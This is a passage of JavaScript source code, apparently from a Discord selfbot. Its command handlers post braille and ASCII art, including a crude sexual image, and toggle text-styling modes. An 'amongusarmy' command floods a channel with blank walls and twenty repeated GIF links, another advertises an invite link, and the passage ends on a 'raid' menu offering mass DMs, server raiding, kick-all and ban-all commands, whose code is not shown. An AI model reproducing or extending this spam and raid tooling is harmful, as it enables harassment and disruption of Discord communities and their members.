            ⡿⣿⣳⣿⣿⣿⣿⣿⠄⠓⠦⠤⠤⠤⠼⢸⣿⣿⣿⣿⣿
            ⡹⣧⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⢇⣓⣾⣿⣿⣿⣿⣿
            ⡞⣸⣿⣿⢏⣼⣶⣶⣶⣶⣤⣶⡤⠐⣿⣿⣿⣿⣿⣿⣿
            ⣯⣽⣛⠅⣾⣿⣿⣿⣿⣿⡽⣿⣧⡸⢿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⡷⠹⠛⠉⠁⠄⠄⠄⠄⠄⠄⠐⠛⠻⣿⣿⣿⣿
            ⣿⣿⣿⠃⠄⠄⠄⠄⠄⣠⣤⣤⣤⡄⢤⣤⣤⣤⡘⠻⣿
            ⣿⣿⡟⠄⠄⣀⣤⣶⣿⣿⣿⣿⣿⣿⣆⢻⣿⣿⣿⡎⠝
            ⣿⡏⠄⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⠐
            ⣿⡏⣲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣿⣿⣿⡟⣼
            ⣿⡠⠜⣿⣿⣿⣿⣟⡛⠿⠿⠿⠿⠟⠃⠾⠿⢟⡋⢶⣿
            ⣿⣧⣄⠙⢿⣿⣿⣿⣿⣿⣷⣦⡀⢰⣾⣿⣿⡿⢣⣿⣿
            ⣿⣿⣿⠂⣷⣶⣬⣭⣭⣭⣭⣵⢰⣴⣤⣤⣶⡾⢐⣿⣿
            ⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⢃⣼⣿⣿
            `)
        }

        if (cmd === "dickart")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ░░░░█─────────────█──▀──
            ░░░░▓█───────▄▄▀▀█──────
            ░░░░▒░█────▄█▒░░▄░█─────
            ░░░░░░░▀▄─▄▀▒▀▀▀▄▄▀──DO─
            ░░░░░░░░░█▒░░░░▄▀───YOU─
            ▒▒▒░░░░▄▀▒░░░░▄▀───LIKE─
            ▓▓▓▓▒░█▒░░░░░█▄───WHAT─
            █████▀▒░░░░░█░▀▄───YOU──
            █████▒▒░░░▒█░░░▀▄─SEE?──
            ███▓▓▒▒▒▀▀▀█▄░░░░█──────
            ▓██▓▒▒▒▒▒▒▒▒▒█░░░░█─────
            ▓▓█▓▒▒▒▒▒▒▓▒▒█░░░░░█────
            ░▒▒▀▀▄▄▄▄█▄▄▀░░░░░░░█─
            `)
        }

        if (cmd === "satisfied")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ‎‎‎‎‎‎‎‎‎‎⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢋⣩⣉⢻
            ⣿⣿⣿⠀⣿⣶⣕⣈⠹⠿⠿⠿⠿⠟⠛⣛⢋⣰⠣⣿⣿⠀⣿
            ⣿⣿⣿⡀⣿⣿⣿⣧⢻⣿⣶⣷⣿⣿⣿⣿⣿⣿⠿⠶⡝⠀⣿
            ⣿⣿⣿⣷⠘⣿⣿⣿⢏⣿⣿⣋⣀⣈⣻⣿⣿⣷⣤⣤⣿⡐⢿
            ⣿⣿⣿⣿⣆⢩⣝⣫⣾⣿⣿⣿⣿⡟⠿⠿⠦⠀⠸⠿⣻⣿⡄⢻
            ⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⠇⣼
            ⣿⣿⣿⣿⣿⣿⡄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰
            ⣿⣿⣿⣿⣿⣿⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⣿
            ⣿⣿⣿⣿⣿⠏⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿
            ⣿⣿⣿⣿⠟⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿
            ⣿⣿⣿⠋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⣿
            ⣿⣿⠋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸
            ⣿⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿
            `)
        }

        if (cmd === "whentheimpostorissusv2")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⣠⣤⣴⣶⣶⣶⣶⣤⡀⠈⠙⢿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠈⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⡇⠄⠄⠁ ⭕ ⠄⢹⣿⡗⠄ ⭕ ⢄⡀⣾⢀⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿⣿⣿
            ⣿⠿⠿⠋⠉⠄⠄⠄⠄⠄⠄⠄⣀⣠⣾⣿⣿⣿⡟⠁⠹⡇⣸⣿⣿⣿⣿⣿⣿
            ⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⠿⠿⠛⠋⠄⣸⣦⣠⣿⣿⣿⣿⣿⣿⣿
            `)
        }

        if (cmd === "fortnitedance")
        {
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⣀⣤
                ⠀⠀⠀⠀⣿⠿⣶
                ⠀⠀⠀⠀⣿⣿⣀
                ⠀⠀⠀⣶⣶⣿⠿⠛⣶
                ⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤
                ⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀
                ⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿
                ⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉
                ⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿
                ⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿
                ⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿
                ⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤
                ⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿
                ⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿
                ⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿
                ⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿
                ⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿
                ⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿
                ⠀⠀⠀⠛⠛
            `)
            }, 1000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⣀⣶⣀
                ⠀⠀⠀⠒⣛⣭
                ⠀⠀⠀⣀⠿⣿⣶
                ⠀⣤⣿⠤⣭⣿⣿
                ⣤⣿⣿⣿⠛⣿⣿⠀⣀
                ⠀⣀⠤⣿⣿⣶⣤⣒⣛
                ⠉⠀⣀⣿⣿⣿⣿⣭⠉
                ⠀⠀⣭⣿⣿⠿⠿⣿
                ⠀⣶⣿⣿⠛⠀⣿⣿
                ⣤⣿⣿⠉⠤⣿⣿⠿
                ⣿⣿⠛⠀⠿⣿⣿
                ⣿⣿⣤⠀⣿⣿⠿
                ⠀⣿⣿⣶⠀⣿⣿⣶
                ⠀⠀⠛⣿⠀⠿⣿⣿
                ⠀⠀⠀⣉⣿⠀⣿⣿
                ⠀⠶⣶⠿⠛⠀⠉⣿
                ⠀⠀⠀⠀⠀⠀⣀⣿
                ⠀⠀⠀⠀⠀⣶⣿⠿
            `)
            }, 2000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
                ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
                ⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
                ⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
            `)
            }, 3000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⣀
                ⠀⠿⣿⣿⣀
                ⠀⠉⣿⣿⣀
                ⠀⠀⠛⣿⣭⣀⣀⣤
                ⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀
                ⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶
                ⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉
                ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
                ⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿
                ⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿
                ⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿
                ⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿
                ⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀
                ⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶
                ⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿
                ⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉
                ⣀⣶⣿⠛
                `)
            }, 4000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿
                ⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉
                ⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉⠀⠀⠀⠀⠀⠀
                ⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤⠀⠀
                ⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉⠀
                `)
            }, 5000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⠀⠀⣤⣶⣶
                ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀
                ⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿
                ⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿
                ⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿
                ⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤
                ⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿
                ⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿
                ⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛
                ⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀
                ⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿
                ⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿
                ⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿
                ⠀⠀⠀⠀⠀⠀⣀⣿⣿
                ⠀⠀⠀⠀⠤⣿⠿⠿⠿
                `)
            }, 6000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⣀
                ⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤
                ⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀
                ⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀
                ⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿
                ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
                ⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿
                ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
                ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉
                ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉
                `)
            }, 7000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⠀⠀⣶⣿⣶
                ⠀⠀⠀⣤⣤⣤⣿⣿⣿
                ⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶
                ⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
                ⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶
                ⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
                ⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶
                ⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤
                ⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿
                ⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉
                ⠀⠀⠀⣿⣿⣿⣿⣿⣶
                ⠀⠀⠀⠀⣿⠉⠿⣿⣿
                ⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿
                ⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉
                `)
            }, 8000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶
                ⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶
                ⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤
                ⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀
                ⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿
                ⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶
                ⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒
                ⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉
                ⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛
                ⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭
                ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤
                ⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿
                ⠀⠀⠀⠀⠀⠀⣿⠛
                ⠀⠀⠀⠀⠀⠀⣭⣶
                `)
            }, 9000)
            setTimeout(function() {
                message.edit(`‎‎‎‎‎‎‎‎‎‎
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
                ⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀
                ⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀
                ⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤
                ⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿
                ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿
                ⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉
                ⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿
                ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉
                ⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀
                ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿
                ⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿
                ⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛
                `)
            }, 10000)
        }

        if (cmd === "autoyifive")
        {
            if (yifive === "off") 
            {
                yifive = "on";
                message.delete()
                DoNotif("```YiFive Text mode enabled. ✅```")
            } 
            else
            {
                yifive = "off";
                message.delete()
                return DoNotif("```YiFive Text mode disabled. ❌```");
            }
        }

        if (cmd === "autosmalltext")
        {
            if (smalltext === "off") 
            {
                smalltext = "on";
                message.delete()
                DoNotif("```Small Text mode enabled. ✅```")
            } 
            else
            {
                smalltext = "off";
                message.delete()
                return DoNotif("```Small Text mode disabled. ❌```");
            }
        }

        if (cmd === "autoinfotext")
        {
            if (infotext === "off") 
            {
                infotext = "on";
                message.delete()
                DoNotif("```Info Text mode enabled. ✅```")
            } 
            else
            {
                infotext = "off";
                message.delete()
                return DoNotif("```Info Text mode disabled. ❌```");
            }
        }

        if (cmd === "autoboldtext")
        {
            if (boldtext === "off") 
            {
                boldtext = "on";
                message.delete()
                DoNotif("```Bold Text mode enabled. ✅```")
            } 
            else
            {
                boldtext = "off";
                message.delete()
                return DoNotif("```Bold Text mode disabled. ❌```");
            }
        }

        if (cmd === "autospoiler")
        {
            if (autospoiler === "off") 
            {
                autospoiler = "on";
                message.delete()
                DoNotif("```Auto Spoiler mode enabled. ✅```")
            } 
            else
            {
                autospoiler = "off";
                message.delete()
                return DoNotif("```Auto Spoiler mode disabled. ❌```");
            }
        }

        if (cmd === "autopingz")
        {
            if (pingz === "off") 
            {
                pingz = "on";
                message.delete()
                DoNotif("```Auto Pingz mode enabled. ✅```")
            } 
            else
            {
                pingz = "off";
                message.delete()
                return DoNotif("```Auto Pingz mode disabled. ❌```");
            }
        }

        if (cmd === "autoanimatedletter")
        {
            setTimeout(function() 
            {
                message.delete()
                message.channel.send("join this server for get the special emojis: https://discord.gg/FkDbHkFAHG")
            }, 1)

            setTimeout(function() 
            {
                if (animatedletter === "off") 
                {
                    animatedletter = "on";
                    DoNotif("```Auto Animated Letter mode enabled. ✅```")
                } 
                else
                {
                    animatedletter = "off";
                    return DoNotif("```Auto Animated Letter mode disabled. ❌```");
                }
            }, 10000)
        }

        if (cmd === "autoowoifytext")
        {
            if (owofie_text === "off") 
            {
                owofie_text = "on";
                message.delete()
                DoNotif("```OwOfie mode enabled. ✅```")
            } 
            else
            {
                owofie_text = "off";
                message.delete()
                return DoNotif("```OwOfie mode disabled. ❌```");
            }
        }

        if (cmd === "betteremojis")
        {
            if (betteremojis === "off") 
            {
                betteremojis = "on";
                message.delete()
                DoNotif("```Better Emojis mode enabled. ✅```")
            } 
            else
            {
                betteremojis = "off";
                message.delete()
                return DoNotif("```Better Emojis mode disabled. ❌```");
            }
        }

        if (cmd === "amongusarmy")
        {
            message.delete()
            message.channel.send(`᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼`);
            message.channel.send(`᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼`);
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
            message.channel.send("https://i.ibb.co/sjr3drL/image0-12.gif")
        }


        //#endregion



        //#region > RAID MENU & OPTIONS

        if (cmd === "raid") 
        {
            message.delete()
        
            const textmenu = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙍𝙖𝙞𝙙」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "serverinfo ```**", `***${language.SERVERINFO_DESC}.***`)
                .addField("**```" + prefix + "dmall + TEXT ```**", `***${language.DMALL_DESC}.***`)
                .addField("**```" + prefix + "raidserv ```**", `***${language.RAIDSERV_DESC}.***`)
                .addField("**```" + prefix + "kickall ```**", `***${language.KICKALL_DESC}.***`)
                .addField("**```" + prefix + "banall ```**", `***${language.BANALL_DESC}.***`)
